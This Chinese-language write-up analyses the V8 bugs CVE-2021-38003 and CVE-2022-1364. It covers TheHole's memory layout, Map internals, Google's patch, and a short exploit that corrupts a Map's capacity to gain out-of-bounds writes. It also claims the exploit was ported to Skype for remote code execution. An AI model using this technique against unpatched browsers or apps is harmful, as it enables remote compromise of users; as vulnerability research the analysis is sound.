## 0x00-背景简述

### CVE-2021-38003

CVE-2021-38003是2021年的一个在野漏洞，[Issue1263462](https://bugs.chromium.org/p/chromium/issues/detail?id=1263462)，漏洞根源在于JsonStringifier::SerializeObject()在返回前，没有对标记设置pending
exception，导致直接把pending_exception的值泄露给了JavsScript。（关于该漏洞的具体分析可参考谷歌的官方报告），而泄露TheHole原始对象恰好违反了[Chrome源码](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/js-call-reducer.cc;drc=a6d43952bb3bc5a90e3d085f4e2a94320d80cc9c;l=754)中的假设，基于此可以轻松实现内存破坏。实际上在谷歌issue报告中公开的poc已经实现设置map.size为-1，可以直接导致浏览器沙箱内进程崩溃。关于此issue已经有公开分析，这里不再赘述。

漏洞修复可以说是简单粗暴：

    
    
    Object Isolate::pending_exception() {
    -  DCHECK(has_pending_exception());
    +  CHECK(has_pending_exception());
       DCHECK(!thread_local_top()->pending_exception_.IsException(this));
       return thread_local_top()->pending_exception_;
     }

将DCHECK直接改为CHECK即可。这里不得不补充一句是，类似这样简单粗暴的修复，往往容易疏漏一些问题，甚至留下隐患。CVE-2022-1364的exp正好证实了这个观点。

``

``

### CVE-2022-1364

CVE-2022-1364是2022年4月13日由P0提交[issue1315901](https://bugs.chromium.org/p/chromium/issues/detail?id=1315901)，公开poc可导致优化前后输出错误。漏洞根源在于节点逃逸分析时，对非标准api`.getThis`考虑疏漏了。最终导致不同的js变量可以访问相同的内存对象。

分析该漏洞前，我们需要对optimization和deoptimization做下简单的了解。（[Modern attacks on the Chrome
browser : optimizations and
deoptimizations](https://doar-e.github.io/blog/2020/11/17/modern-attacks-on-the-chrome-browser-optimizations-and-deoptimizations/)对deoptimization的解释非常亲民，推荐阅读）。我们还需要了解下Framestates，这里推荐阅读[V8
Optimize:
FrameState](https://bugs.chromium.org/p/chromium/issues/detail?id=788539)文章和参考issue788539。

## 0x01-TheHole in v8

TheHole是v8中的一个特殊对象。我们可以从d8中先了解下该对象内存布局

    
    
    d8> load('/home/avboy/Desktop/poc.js');
    hole
    DebugPrint: 0x1cd108002449: [Oddball] in ReadOnlySpace: #hole
    0x1cd108002421: [Map] in ReadOnlySpace
     - type: ODDBALL_TYPE
     - instance size: 28
     - elements kind: HOLEY_ELEMENTS
     - unused property fields: 0
     - enum length: invalid
     - stable_map
     - non-extensible
     - back pointer: 0x1cd1080023d1 <undefined>
     - prototype_validity cell: 0
     - instance descriptors (own) #0: 0x1cd1080021dd <Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)>
     - prototype: 0x1cd108002251 <null>
     - constructor: 0x1cd108002251 <null>
     - dependent code: 0x1cd1080021d1 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
     - construction counter: 0

与JavaScript中的常量True/False/null/undefined等类似，TheHole也属于ODDBALL_TYPE。但我们无法从Javascript中获取TheHole对象。因为Chrome不允许将TheHole泄漏到Js中，从[Chrome源码](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/js-call-reducer.cc;drc=a6d43952bb3bc5a90e3d085f4e2a94320d80cc9c;l=754)中也容易得到该结论：

    
    
    template <typename... Vars>
      TNode<Object> MaybeSkipHole(
          TNode<Object> o, ElementsKind kind,
          GraphAssemblerLabel<sizeof...(Vars)>* continue_label,
          TNode<Vars>... vars) {
    // .........省略
    // .........省略
        // The contract is that we don't leak "the hole" into "user JavaScript",
        // so we must rename the {element} here to explicitly exclude "the hole"
        // from the type of {element}.
        Bind(&if_not_hole);
        return TypeGuardNonInternal(o);
      }

``

## 0x02-TheHole内存布局

值得一提的是，由于TheHole属于ODDBALL_TYPE，其内存布局非常接近v8的最原始对象。在v8-10.0.1版本中，如下所示，我们可以了解下TheHole的整体内存布局：

    
    
    Self
    1CD108002130        08002131 1B00000A 0C0000F8 004003FF
    1CD108002140        08002251 08002251 080021DD 080021D1
    1CD108002150        00000000 00000000 0badbeef 0badbeef
                        Map
    1CD108002420        08002131 39000007 0C000083 004003FF
    1CD108002430        08002251 08002251 080021DD 080021D1
                                           TheHole
    1CD108002440        00000000 00000000 08002421 FFF7FFFF

不难看出，TheHole对象的Map指向1CD108002420，内存1CD108002420处对象的Map（地址为0x1CD108002131）指向自身。gdb解析结果如下：

    
    
    pwndbg> job 0x1CD108002131
    0x1cd108002131: [Map] in ReadOnlySpace
     - type: MAP_TYPE
     - instance size: 40
     - elements kind: HOLEY_ELEMENTS
     - unused property fields: 0
     - enum length: invalid
     - stable_map
     - non-extensible
     - back pointer: 0x1cd1080023d1 <undefined>
     - prototype_validity cell: 0
     - instance descriptors (own) #0: 0x1cd1080021dd <Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)>
     - prototype: 0x1cd108002251 <null>
     - constructor: 0x1cd108002251 <null>
     - dependent code: 0x1cd1080021d1 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
     - construction counter: 0

由于该对象的Map为自身，即递归解析Map到此便结束了。这样的内存布局，在对象伪造的时候，确实提供了不少便捷。比如类似issue1084820等利用，在常规内存布局不稳定的时候，也可以考虑从伪造/泄漏TheHole对象，从最原始的指向自身的对象开始，模拟0x1CD108002130地址处的数据伪造对象。``

``

## 0x03-漏洞利用

展开漏洞利用前，对Map对象的结构进行简单的了解有助于我们完成整个利用。这里推荐[[V8 Deep Dives] Understanding Map
Internals](https://itnext.io/v8-deep-dives-understanding-map-internals-45eb94a183df)，通俗易懂。

虽然CVE-2022-1364漏洞根源与CVE-2021-38003不同，并没有出在pending_exception_标记设置上，但是通过逃逸分析，结合Error对象构造和优化，也成功的将TheHole返回给了JS。该poc非常值得深入探讨。

TheHole对象在返回给JS后，我们可以从CVE-2021-38003的poc中学习其利用手法，轻松实现map.size为-1。此时实际上并不像1150649等issue那样，因为size是-1就能实现内存任意读写。尝试执行map1.set()函数后，map.size就会增加为0。由此可见，该漏洞利用的关键在于借助map1.set函数破坏内存，进而实现相对读写，然后再按以往常规思路实现RCE。CVE-2022-1364与CVE-2021-38003的漏洞利用手法几乎如出一辙。

### Map结构

测试脚本如下

    
    
    m = new Map();
    %DebugPrint(m);
    readline();

``

``

m作为Map对象，内存布局如下``

    
    
    2DB60810AE54        082C2771 08002249 08002249 0810AE65
    2DB60810AE64        08002C19 00000022 00000000 00000000
    2DB60810AE74        00000004 FFFFFFFE FFFFFFFE 080023D1

````

这里我们需要了解的是地址0x2DB60810AE74处的4是如何解析的。其含义如下所示

``

    
    
    pwndbg> job 0x2DB60810AE65
    0x2db60810ae65: [OrderedHashMap]
     - FixedArray length: 17
     - elements: 0
     - deleted: 0
     - buckets: 2
     - capacity: 4
     - buckets: {
                  0: -1
                  1: -1
     }
     - elements: {
     }

````

不难得出结论，0x2DB60810AE74处数据表示的是capacity。在哈希表中，capacity总是可以表示成2的幂，空的哈希表有两个buckets，表的容量最大是`2
* number_of_buckets`。

### 覆盖capacity

掌握了以上理论后，我们回来继续撰写exp。在得到map.size为-1后，调用set函数尝试写入。查看内存发现，恰好可覆盖capacity位置。这里关键是要符合v8对capacity的要求，同时将其设置为一个较大的数值，既要达到越界相对写的目的，又要不崩溃Chrome。关键设置语句可使用如下set函数实现：

``

    
    
    map1.set(0x10, -1);

````

符合v8要求，且尽可能实现最小限度的越界写。至此，便实现了Map的相对越界写，剩下的exp步骤与常规思路完全一致，这里不再赘述。

### Exploit

实际上即使没有优化等漏洞，仅采用native语法中的`%TheHole()`也可实现RCE，最终实现修改数组Length代码如下所示（exp是切换到修复缓解之前哈希`66c8de2cdac10cad9e622ecededda411b44ac5b3~`环境下测试的，不过该exp几乎不依赖chrome/d8版本），foo_arr已经实现相对越界写：

    
    
    var map1 = null;
    var foo_arr = null;
    function getmap(m) {
        m = new Map();
        m.set(1, 1);
        m.set(%TheHole(), 1);
        m.delete(%TheHole());
        m.delete(%TheHole());
        m.delete(1);
        return m;
    }
    for (let i = 0; i < 0x3000; i++) {
        map1 = getmap(map1);
        foo_arr = new Array(1.1, 1.1);//1.1=3ff199999999999a
    }
    map1.set(0x10, -1);
    gc();
    map1.set(foo_arr, 0xffff);
    %DebugPrint(foo_arr);

``

## 0x04-Chrome修复

与issue1150649类似，在该Issue详情公开后，其利用手法也随之被公开。此时对Chrome来说的确利用难度大打折扣。2021年推特公开的两个[exp](https://twitter.com/frust93717815/status/1382301769577861123)在最新版Chrome可RCE便说明了此问题。

事实上这次谷歌对该利用手法也迅速做了修复，分别对Map.prototype.delete/Set.prototype.delete/WeakMap.prototype.delete/WeakSet.prototype.delete增加了[校验](https://chromium.googlesource.com/v8/v8/+/66c8de2cdac10cad9e622ecededda411b44ac5b3%5E%21/#F0)，当key为TheHole对象时Render进程会主动崩溃：

    
    
    @@ -1762,6 +1762,9 @@
       ThrowIfNotInstanceType(context, receiver, JS_MAP_TYPE,
                              "Map.prototype.delete"); 
    +  // This check breaks a known exploitation technique. See crbug.com/1263462
    +  CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));
    +
       const TNode<OrderedHashMap> table =
           LoadObjectField<OrderedHashMap>(CAST(receiver), JSMap::kTableOffset);
     
    @@ -1930,6 +1933,9 @@
       ThrowIfNotInstanceType(context, receiver, JS_SET_TYPE,
                              "Set.prototype.delete"); 
    +  // This check breaks a known exploitation technique. See crbug.com/1263462
    +  CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));
    +
       const TNode<OrderedHashSet> table =
           LoadObjectField<OrderedHashSet>(CAST(receiver), JSMap::kTableOffset);
     
    @@ -2878,6 +2884,9 @@
       ThrowIfNotInstanceType(context, receiver, JS_WEAK_MAP_TYPE,
                              "WeakMap.prototype.delete"); 
    +  // This check breaks a known exploitation technique. See crbug.com/1263462
    +  CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));
    +
       Return(CallBuiltin(Builtin::kWeakCollectionDelete, context, receiver, key));
     }

``0x05-PatchGap

在迅速完成exp后，考虑到Chrome漏洞的PatchGap效应，我们将该exp迅速移植到了最新版的Skype。Skype在打开部分白名单网站时，会调用内置浏览器。假设我们拥有Skype白名单URL的一个XSS进行测试，如下视频可以看到，最终可在Skype最新版实现远程RCE。

<https://mp.weixin.qq.com/s/U69ZlQ8TFpl76FQLAfcI-g>

事实上，在ChromePatchGap方向，我们也一直维持有众多IM最新版RCE。

## 0x06-参考链接

https://chromium.googlesource.com/v8/v8/+/66c8de2cdac10cad9e622ecededda411b44ac5b3

https://twitter.com/frust93717815/status/1382301769577861123

https://chromium.googlesource.com/v8/v8/+/66c8de2cdac10cad9e622ecededda411b44ac5b3%5E%21/#F0

https://itnext.io/v8-deep-dives-understanding-map-internals-45eb94a183df

https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/js-call-reducer.cc;drc=a6d43952bb3bc5a90e3d085f4e2a94320d80cc9c;l=754

https://bugs.chromium.org/p/chromium/issues/detail?id=1263462

https://bugs.chromium.org/p/chromium/issues/detail?id=1315901

https://doar-e.github.io/blog/2020/11/17/modern-attacks-on-the-chrome-browser-optimizations-and-deoptimizations/

